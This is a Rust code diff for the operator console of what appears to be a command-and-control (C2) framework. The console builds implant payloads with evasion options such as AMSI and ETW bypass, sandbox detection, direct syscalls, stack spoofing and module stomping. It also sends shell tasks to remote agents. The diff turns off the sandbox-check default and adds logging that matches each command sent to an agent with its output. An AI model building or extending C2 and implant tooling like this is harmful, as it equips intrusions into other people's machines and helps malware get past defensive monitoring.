@@ -101,7 +101,7 @@ impl Default for PayloadDraft {
             injection_idx: 0,
             amsi:          true,
             etw:           true,
-            sandbox:       true,
+            sandbox:       false,
             syscalls:      false,
             stack_spoof:   false,
             module_stomp:  false,
@@ -204,6 +204,7 @@ pub struct App {
     pub command_input: String,
     pub build_status:  Option<String>,
     pub ws_tx:         mpsc::Sender<OpMessage>,
+    pub pending_cmds:  std::collections::HashMap<Uuid, String>,
 }
 
 impl App {
@@ -229,6 +230,7 @@ impl App {
             command_input: String::new(),
             build_status: None,
             ws_tx,
+            pending_cmds: std::collections::HashMap::new(),
         }
     }
 
@@ -273,9 +275,19 @@ impl App {
                 self.push_log(format!("agent dead: {}", agent_id));
             }
             SrvMessage::TaskResult { result } => {
-                self.push_log(format!("[{}] {}", result.task_id, result.output.trim()));
+                let cmd = self.pending_cmds.remove(&result.task_id)
+                    .unwrap_or_else(|| result.task_id.to_string());
+                if !result.output.trim().is_empty() {
+                    for line in result.output.trim().lines() {
+                        self.push_log(format!("  {line}"));
+                    }
+                }
                 if let Some(e) = result.error {
-                    self.push_log(format!("  error: {e}"));
+                    self.push_log(format!("  [ERR] {e}"));
+                } else if result.output.trim().is_empty() {
+                    self.push_log(format!("← {cmd} (no output)"));
+                } else {
+                    self.push_log(format!("← {cmd}"));
                 }
             }
             SrvMessage::BuildStart { build_id } => {
@@ -583,11 +595,15 @@ impl App {
                             } else {
                                 vec![]
                             };
+                            let task_id = uuid::Uuid::new_v4();
+                            let display = cmd_str.clone();
                             let task = oxide_common::types::AgentTask {
-                                id: uuid::Uuid::new_v4(),
+                                id: task_id,
                                 command,
                                 args,
                             };
+                            self.pending_cmds.insert(task_id, display.clone());
+                            self.push_log(format!("→ {display}"));
                             self.send_op(OpMessage::TaskAgent { agent_id: aid, task }).await;
                         }
                     }
